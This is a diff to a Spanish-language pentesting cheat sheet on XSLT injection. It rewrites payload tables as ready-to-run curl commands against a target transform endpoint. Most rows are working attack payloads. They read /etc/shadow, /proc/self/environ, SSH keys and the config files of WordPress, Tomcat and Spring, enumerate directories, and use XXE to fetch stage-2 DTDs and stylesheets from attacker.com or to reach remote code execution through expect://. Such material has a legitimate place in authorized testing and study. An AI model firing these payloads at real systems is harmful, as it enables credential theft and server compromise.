@@ -27,17 +27,20 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Lectura XML local Linux | `<xsl:copy-of select="document('file:///etc/tomcat9/server.xml')"/>` | Solo si el archivo es XML válido. |
-| Lectura XML local Windows | `<xsl:copy-of select="document('file:///C:/inetpub/wwwroot/web.config')"/>` | IIS connection strings. |
-| Lectura raw 2.0+ | `<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>` | Saxon — cualquier texto, no solo XML. |
-| Con encoding | `<xsl:value-of select="unparsed-text('file:///etc/shadow', 'UTF-8')"/>` | Force charset. |
-| Por líneas (3.0) | `<xsl:for-each select="unparsed-text-lines('file:///etc/passwd')">...</xsl:for-each>` | Iterar línea a línea. |
-| `/proc/self/environ` | `<xsl:value-of select="unparsed-text('file:///proc/self/environ')"/>` | Env vars del proceso (creds en deploys). |
-| `/proc/self/cmdline` | `<xsl:value-of select="unparsed-text('file:///proc/self/cmdline')"/>` | CLI args (`-Dpassword=...`). |
-| Existencia | `<xsl:value-of select="unparsed-text-available('file:///root/.ssh/id_rsa')"/>` | Boolean oracle sin contenido. |
-| Path traversal | `<xsl:copy-of select="document('../../../../etc/passwd')"/>` | Relativo al stylesheet base. |
-| URL-encoded traversal | `<xsl:copy-of select="document('..%2F..%2Fetc%2Fpasswd')"/>` | Bypass de filtros básicos. |
-| Wrapper externo | `<xsl:copy-of select="document('http://attacker/wrap.xsl')"/>` | Atacante sirve XSL que lee archivos no-XML. |
+| `curl -X POST --data '<xsl:copy-of select="document(&apos;file:///etc/tomcat9/server.xml&apos;)"/>' https://target/transform` | Read XML local Linux server.xml | Solo XML válido. |
+| `curl -X POST --data '<xsl:copy-of select="document(&apos;file:///C:/inetpub/wwwroot/web.config&apos;)"/>' https://target/transform` | Read IIS web.config connection strings | Windows IIS. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///etc/passwd&apos;)"/>' https://target/transform` | Read raw text Saxon 2.0+ (cualquier texto) | Saxon 2.0+. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///etc/shadow&apos;, &apos;UTF-8&apos;)"/>' https://target/transform` | Read con charset forced UTF-8 | Encoding-aware. |
+| `curl -X POST --data '<xsl:for-each select="unparsed-text-lines(&apos;file:///etc/passwd&apos;)"><xsl:value-of select="."/></xsl:for-each>' https://target/transform` | Per-line iteration XPath 3.0 | XPath 3.0. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///proc/self/environ&apos;)"/>' https://target/transform` | Read process env vars | High-value secrets. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///proc/self/cmdline&apos;)"/>' https://target/transform` | Read process CLI args | CLI args reveal `-Dpassword=`. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text-available(&apos;file:///root/.ssh/id_rsa&apos;)"/>' https://target/transform` | Boolean oracle file existence sin contenido | Boolean oracle. |
+| `curl -X POST --data '<xsl:copy-of select="document(&apos;../../../../etc/passwd&apos;)"/>' https://target/transform` | Relative path traversal | Path traversal. |
+| `curl -X POST --data '<xsl:copy-of select="document(&apos;..%2F..%2Fetc%2Fpasswd&apos;)"/>' https://target/transform` | URL-encoded traversal filter bypass | Encoding bypass. |
+| `curl -X POST --data '<xsl:copy-of select="document(&apos;http://attacker.com/wrap.xsl&apos;)"/>' https://target/transform` (attacker hosts wrap.xsl que lee non-XML) | External wrapper for non-XML reads | External XSL wrapper. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///var/www/html/wp-config.php&apos;)"/>' https://target/transform` | wp-config.php read | WordPress. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///etc/tomcat9/tomcat-users.xml&apos;)"/>' https://target/transform` | Tomcat admin hashes | Tomcat creds. |
+| `curl -X POST --data '<xsl:value-of select="unparsed-text(&apos;file:///opt/app/application.properties&apos;)"/>' https://target/transform` | Spring DB creds | Spring app. |
 ^xslt-lfi-document
 
 ### Archivos de alto valor
@@ -58,12 +61,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| XXE clásico file | `<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:template match="/"><out>&xxe;</out></xsl:template>` | Si el parser XML del XSLT no bloquea entidades externas. |
-| XXE Windows | `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` | Probe legible Windows. |
-| XXE param entity OOB | `<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe;` | Stage 2 desde DTD remoto. |
-| XXE php filter | `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">` | Lee fuente PHP base64. |
-| XXE expect (RCE PHP) | `<!ENTITY xxe SYSTEM "expect://id">` | RCE si PHP expect:// está habilitado. |
-| Stylesheet con DOCTYPE | `<?xml version="1.0"?><!DOCTYPE stylesheet [...]><xsl:stylesheet ...>` | DOCTYPE va antes de `xsl:stylesheet`. |
+| `curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform` | Classic XXE file read in XSLT context | Parser sin entity block. |
+| `curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><xsl:stylesheet ...><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform` | Windows XXE win.ini read | Windows. |
+| `curl -X POST -H "Content-Type: application/xml" --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><xsl:stylesheet ...><xsl:template match="/"></xsl:template></xsl:stylesheet>' https://target/transform` | Param entity OOB DTD load stage-2 | OOB DTD. |
+| `curl -X POST --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]><xsl:stylesheet ...><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform' \| base64 -d` | PHP filter base64 source disclosure | PHP filter. |
+| `curl -X POST --data '<?xml version="1.0"?><!DOCTYPE doc [<!ENTITY xxe SYSTEM "expect://id">]><xsl:stylesheet ...><xsl:template match="/"><out>&xxe;</out></xsl:template></xsl:stylesheet>' https://target/transform` | PHP expect:// RCE | PHP expect ext. |
+| `python3 xxer.py -u https://target/transform -p XSLT-XXE` (custom) | DIY XXE-in-XSLT scanner | DIY scanner. |
+| Burp Repeater → modify request → inject DOCTYPE before xsl:stylesheet | Manual XXE-in-XSLT inject | Workflow. |
+| `curl -X POST --data @xxe-in-xslt.xml https://target/transform` (load from file) | Load XXE payload from file | Big payload. |
 ^xslt-lfi-xxe
 
 ### Stylesheet completo XXE-en-XSLT
@@ -80,20 +85,21 @@ ___
 </xsl:stylesheet>
 ```
 
-Ver [[XML External Entity (XXE)]] para variantes de XXE específicas.
-
 ___
 
 ## Lectura de Directorios
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Listar dir Saxon 9+ | `<xsl:for-each select="collection('file:///etc/?select=*;recurse=no')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Iterador con filtro glob. |
-| Listar recursivo | `<xsl:for-each select="collection('file:///var/www/?select=*;recurse=yes')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Recurse=yes. |
-| Filtro por extensión | `<xsl:for-each select="collection('file:///etc/?select=*.xml')">...</xsl:for-each>` | Glob *.xml / *.conf / *.bak. |
-| Metadata | `<xsl:for-each select="collection('file:///etc/?select=*;metadata=yes')">...</xsl:for-each>` | Tamaño, modificado, etc. |
-| Pasar dir como file | `<xsl:copy-of select="document('file:///etc/')"/>` | Algunos motores devuelven listing al pasar dir. |
-| libxslt dir leak | `<xsl:value-of select="document('file:///proc/self/fd/')"/>` | Open file descriptors del proceso. |
+| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*;recurse=no&apos;)"><xsl:value-of select="document-uri(.)"/><xsl:text>&#10;</xsl:text></xsl:for-each>' https://target/transform` | Dir listing Saxon 9+ con glob | Saxon collection. |
+| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///var/www/?select=*;recurse=yes&apos;)"><xsl:value-of select="document-uri(.)"/></xsl:for-each>' https://target/transform` | Recursive dir listing | Recurse. |
+| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*.conf&apos;)"><xsl:value-of select="document-uri(.)"/></xsl:for-each>' https://target/transform` | Filter `.conf` files | Extension filter. |
+| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*.bak&apos;)"><xsl:value-of select="document-uri(.)"/></xsl:for-each>' https://target/transform` | Filter `.bak` backups | Backups. |
+| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*;metadata=yes&apos;)"><xsl:copy-of select="."/></xsl:for-each>' https://target/transform` | Metadata size/modified | Metadata. |
+| `curl -X POST --data '<xsl:copy-of select="document(&apos;file:///etc/&apos;)"/>' https://target/transform` | Pass dir as file (some engines list) | Edge engine. |
+| `curl -X POST --data '<xsl:value-of select="document(&apos;file:///proc/self/fd/&apos;)"/>' https://target/transform` | libxslt /proc fd listing | libxslt /proc. |
+| `for dir in /etc /var/www /opt /home /root; do echo "[$dir]"; curl -X POST --data "<xsl:for-each select=\"collection('file://$dir/?select=*')\"><xsl:value-of select=\"document-uri(.)\"/></xsl:for-each>" https://target/transform; done` | Bulk dir enum loop | Bulk enum. |
+| `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*.xml;recurse=yes&apos;)"><xsl:value-of select="document-uri(.)"/><xsl:text>&#10;</xsl:text></xsl:for-each>' https://target/transform \| sort -u` | Bulk XML files recursive enum | XML-config enum. |
 ^xslt-lfi-dirs
 
 ***
